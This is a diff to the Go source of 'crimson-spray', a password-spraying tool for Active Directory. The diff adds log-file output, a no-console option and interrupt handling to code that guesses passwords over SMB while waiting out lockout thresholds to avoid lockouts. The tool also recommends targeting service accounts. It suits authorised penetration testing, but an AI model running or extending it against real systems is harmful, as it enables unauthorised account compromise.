@@ -3,9 +3,11 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"os"
+	"os/signal"
 	"strings"
 	"sync"
 	"time"
@@ -15,7 +17,7 @@ import (
 )
 
 func main() {
-	parser := argparse.NewParser("crimson-spray", "(v.0.1.1) A lockout aware password sprayer for Active Directory. Please enter the raw net accounts /domain variables for best results. It is also advisable to use this against service accounts.")
+	parser := argparse.NewParser("crimson-spray", "(v.0.2.0) A lockout aware password sprayer for Active Directory. Please enter the raw net accounts /domain variables for best results. It is also advisable to use this against service accounts.")
 	var userFilePathArg = parser.String("u", "username-file", &argparse.Options{Required: true, Help: "(Required) File of users separated by newlines"})
 	var passFilePathArg = parser.String("p", "password-file", &argparse.Options{Required: true, Help: "(Required) File of passwords seperated by newlines. A good wordlist generator can be found at https://weakpass.com/generate"})
 	var domainArg = parser.String("d", "domain", &argparse.Options{Required: true, Help: "(Required) Domain of user "})
@@ -25,24 +27,65 @@ func main() {
 	var lockTime = parser.Int("r", "Lockout-Timer", &argparse.Options{Required: true, Help: "(Required) Duration of time in minutes for an locked out account to become unlocked. If account lockout is detected, program will wait this time + 1 minute.\n"})
 	var bypassWait = parser.Flag("", "bypass-wait", &argparse.Options{Help: "Bypass initial lock threshold reset period"})
 	var noHeaderArg = parser.Flag("", "no-stats", &argparse.Options{Default: false, Help: "Suppress stats banner"})
-	var verboseArg = parser.Int("v", "verbose", &argparse.Options{Default: 2, Help: "0 - No output (will disable prerun stats) | 1 - Success Messages | 2 - Lockout , Pause , and Success Messages | 3 - Attempts, Pause, Lockout and Success Messages | 4 - Debug Messages"})
-
+	var verboseArg = parser.Int("v", "verbose", &argparse.Options{Default: 2, Help: "0 - Reserved | 1 - Success Messages | 2 - Lockout , Pause , and Success Messages | 3 - Attempts, Pause, Lockout and Success Messages | 4 - Debug Messages"})
+	var logOutputFileArg = parser.String("o", "logfile", &argparse.Options{Default: "", Help: "If defined, output log to file"})
+	var noConsole = parser.Flag("", "no-console", &argparse.Options{Help: "No console output"})
 	err := parser.Parse(os.Args)
-	log.SetOutput(os.Stdout)
-	if err != nil {
-		log.Println(parser.Usage(err))
+
+	var logfile *os.File
+	var multiwriter io.Writer
+	var consoleOut *os.File
+
+	if *noConsole {
+		consoleOut = nil
 	} else {
-		if *noHeaderArg == false && *verboseArg != 0 {
-			preRunStats(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime, *lockTime, *verboseArg)
-		}
-		if *bypassWait != true {
-			log.Printf("Waiting inital lockout reset threshold... %d mins (You can bypass this with --bypass-wait)", *lockThreshTime)
-			time.Sleep(time.Duration(*lockThreshTime) * time.Minute)
-		}
-		log.Printf("Starting Spray..... ")
-		multiSpray(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime, *lockTime, *verboseArg)
+		consoleOut = os.Stdout
 	}
 
+	//Define if output should be to logfile, stout or both
+	if *logOutputFileArg != "" {
+		logfile, err := os.OpenFile(*logOutputFileArg, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
+		if err != nil {
+			log.Fatalf("error opening/creating logfile: %v", err)
+		}
+		defer logfile.Close()
+		if consoleOut != nil {
+			multiwriter = io.MultiWriter(logfile, consoleOut)
+		} else {
+			multiwriter = io.MultiWriter(logfile)
+		}
+		log.SetOutput(multiwriter)
+	} else {
+		log.SetOutput(consoleOut)
+	}
+
+	// Catch signal cancel and run cleanup scripts
+	c := make(chan os.Signal, 1)
+	signal.Notify(c, os.Interrupt)
+	go func() {
+		for sig := range c {
+			os.Exit(cleanUpScript(sig, logfile))
+		}
+	}()
+
+	// Print Usage and exit
+	if err != nil {
+		log.Println(parser.Usage(err))
+		os.Exit(1)
+	}
+
+	//Check for no verbose or no stats page
+	if !*noHeaderArg && !*noConsole {
+		preRunStats(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime, *lockTime, *verboseArg)
+	}
+
+	if *bypassWait != true {
+		log.Printf("Waiting inital lockout reset threshold... %d mins (You can bypass this with --bypass-wait)", *lockThreshTime)
+		time.Sleep(time.Duration(*lockThreshTime) * time.Minute)
+	}
+
+	log.Printf("Starting Spray..... ")
+	multiSpray(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime, *lockTime, *verboseArg)
 }
 
 func preRunStats(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int, verbose int) {
@@ -100,7 +143,7 @@ func singleUserSpray(usernamePath string, passwordPath string, domain string, ta
 			for i := 0; i < attemptThreshold; i++ {
 				passwordToAttempt := passwordList[currentPasswordIndex+i]
 				trimPasswordToAttempt := strings.TrimSpace(passwordToAttempt)
-				result = testCred(trimUser, trimPasswordToAttempt, domain, targetIP, verbose)
+				result = testCred(trimUser, trimPasswordToAttempt, domain, targetIP, verbose, currentPasswordIndex)
 				if result == 0 {
 					break
 				} else if result == 2 {
@@ -146,7 +189,7 @@ func UserSpray(username string, passwordSlice []string, domain string, targetIP 
 		result := 4 //
 		for i := 0; i <= attemptThreshold; i++ {
 			passwordToAttempt := passwordSlice[currentPasswordIndex]
-			result = testCred(username, passwordToAttempt, domain, targetIP, verbose)
+			result = testCred(username, passwordToAttempt, domain, targetIP, verbose, currentPasswordIndex)
 			if result == 0 {
 				break
 			} else if result == 2 {
@@ -171,7 +214,7 @@ func UserSpray(username string, passwordSlice []string, domain string, targetIP 
 	return fmt.Sprintf("Done user %s", username)
 }
 
-func testCred(name string, passwordGuess string, domainDst string, ip string, verbose int) int {
+func testCred(name string, passwordGuess string, domainDst string, ip string, verbose int, currentAttempt int) int {
 	/* Return Values
 	0 - Log in successful
 	1 - Log in failed
@@ -181,7 +224,7 @@ func testCred(name string, passwordGuess string, domainDst string, ip string, ve
 	*/
 	dstServer := fmt.Sprintf("%s:445", ip)
 	if verbose >= 4 {
-		log.Printf("Attempting to connect to %s", dstServer)
+		log.Printf("Attempting to connect to %s (%s Thread %d)", dstServer, name, currentAttempt)
 	}
 	conn, err := net.Dial("tcp", dstServer)
 	if err != nil {
@@ -189,7 +232,7 @@ func testCred(name string, passwordGuess string, domainDst string, ip string, ve
 	}
 	defer conn.Close()
 	if verbose >= 4 {
-		log.Printf("Connected to %s", dstServer)
+		log.Printf("Connected to %s (%s Thread %d)", dstServer, name, currentAttempt)
 		log.Printf("Attempting %s\\%s:%s @ %s --- ", domainDst, name, passwordGuess, dstServer)
 	}
 	d := &smb2.Dialer{
@@ -243,6 +286,13 @@ func readFile(filepath string) []string {
 		entries = append(entries, scanner.Text())
 	}
 	return entries
+}
+
+func cleanUpScript(signal2 os.Signal, logfile *os.File) int {
+	log.Printf("%s was called\n", signal2)
+	log.Println("Cleanup script ran")
+	logfile.Close()
+	return 1
 }
 
 /*
